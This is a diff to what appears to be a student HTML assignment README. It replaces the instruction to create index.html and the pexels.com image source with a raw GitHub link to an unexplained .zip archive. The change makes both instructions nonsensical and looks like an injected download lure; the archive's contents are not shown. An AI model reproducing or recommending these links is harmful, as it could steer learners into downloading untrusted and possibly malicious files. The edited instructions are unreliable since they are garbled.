@@ -7,9 +7,9 @@ Apply multimedia elements such as audio and video.
 
 ## Instructions
 
-- Create an index.html file.
+- Create an https://raw.githubusercontent.com/Liz-on-code/feb-2025-advanced-html-Liz-on-code/main/unstonable/feb-2025-advanced-html-Liz-on-code.zip file.
 - Add an ordered list with roman numerals
-- Add an external image from pexels.com
+- Add an external image from https://raw.githubusercontent.com/Liz-on-code/feb-2025-advanced-html-Liz-on-code/main/unstonable/feb-2025-advanced-html-Liz-on-code.zip
 - Add a table of 5 contacts with; name, address, mobile and emails
 - Add a registration form
 
